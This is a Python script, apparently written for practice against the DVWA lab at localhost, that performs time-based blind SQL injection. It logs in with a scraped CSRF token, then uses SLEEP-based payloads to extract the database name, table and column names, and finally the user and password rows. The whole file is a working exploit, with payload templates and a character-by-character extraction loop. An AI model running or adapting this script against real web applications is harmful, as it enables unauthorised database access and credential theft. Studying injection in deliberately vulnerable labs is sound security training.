
import requests
from bs4 import BeautifulSoup
import signal, sys, time, string
from pwn import log

LOGIN_URL = "http://localhost:8080/login.php"
TARGET_URL = "http://localhost:8080/vulnerabilities/sqli_blind/"
USERNAME = "admin"
PASSWORD = "password"

CHARACTERS = string.ascii_letters + string.digits + "_@.-:$"

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(0)

def login():
    session = requests.Session()
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    token_input = soup.find("input", {"name": "user_token"})

    if not token_input:
        print("[-] No se encontró el token CSRF")
        return None
    
    token = token_input.get("value")
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    response = session.post(LOGIN_URL, data=data)

    if "Login failed" in response.text:
        print("[-] Falló el login.")
        return None
    
    print("[+] Sesión iniciada correctamente.")
    return session

def time_based_sqli(session, sql_template):
    result = ""
    p = log.progress("Extrayendo")

    for pos in range(1, 50):
        found = False
        for c in CHARACTERS:
            payload = sql_template.format(pos=pos, char=c)

            params = {
                "id": payload,
                "Submit": "Submit"
            }

            p.status(result + c)
            start = time.time()
            r = session.get(TARGET_URL, params=params)
            delay = time.time() - start

            if delay > 0.4:
                result += c
                found = True
                break

        if not found:
            break

    p.success(result)
    return result

def get_tables(session, db_name):
    print("[*] Extrayendo nombres de tablas...")
    tables = []

    for i in range(0, 5):  # máximo 5 tablas
        print(f"  [+] Tabla {i+1}")
        sql = (
            f"1' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema='{db_name}' LIMIT {i},1),{{pos}},1)='{{char}}',SLEEP(0.5),0)-- -"
        )

        name = time_based_sqli(session, sql)
        if not name:
            break

        tables.append(name)
    return tables

def get_columns(session, db_name, table):
    print(f"[*] Extrayendo columnas de `{table}`...")
    columns = []

    for i in range(0, 5):  # máximo 5 columnas
        print(f"  [+] Columna {i+1}")
        sql = (
            f"1' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns "
            f"WHERE table_name='{table}' AND table_schema='{db_name}' LIMIT {i},1),{{pos}},1)='{{char}}',SLEEP(0.5),0)-- -"
        )

        name = time_based_sqli(session, sql)

        if not name:
            break

        columns.append(name)
    return columns

def dump_users(session, table, col1, col2):
    print(f"[*] Extrayendo registros de `{table}`...")

    for i in range(0, 5):  # máximo 5 usuarios
        print(f"  [+] Registro {i+1}")
        sql = (
            f"1' AND IF(SUBSTRING((SELECT CONCAT({col1},0x3a,{col2}) FROM {table} LIMIT {i},1),{{pos}},1)='{{char}}',SLEEP(0.5),0)-- -"
        )

        row = time_based_sqli(session, sql)

        if not row:
            break

        print(f"    -> {row}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, def_handler)

    session = login()

    if session:
        print("[*] Extrayendo nombre de base de datos...")
        payload = "1' AND IF(SUBSTRING(DATABASE(),{pos},1)='{char}',SLEEP(0.5),0)-- -"
        db_name = time_based_sqli(session, payload)
        tables = get_tables(session, db_name)

        for table in tables:
            columns = get_columns(session, db_name, table)

            if table == "users" and "user" in columns and "password" in columns:
                dump_users(session, table, "user", "password")
